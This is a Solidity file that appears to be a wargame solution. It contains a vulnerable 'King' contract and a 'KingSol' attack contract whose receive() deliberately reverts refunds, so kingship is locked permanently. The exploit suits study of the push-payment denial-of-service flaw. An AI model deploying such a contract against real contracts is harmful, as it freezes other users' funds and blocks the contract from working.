// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;

contract KingSol {
    King public targetContract;
    event Deposit(address indexed _from);

    constructor(address payable _targetContract) {
        targetContract = King(_targetContract);
    }

    function sendEth() public payable returns(bool){
        (bool ret,) = address(targetContract).call{value: msg.value}("");
        return ret;
    }

    receive() external payable {
        emit Deposit(msg.sender);
        payable(address(targetContract)).transfer(0x0);
    }
}

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() payable {
    owner = payable(address(msg.sender));  
    king = payable(address(msg.sender));
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = payable(address(msg.sender));
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}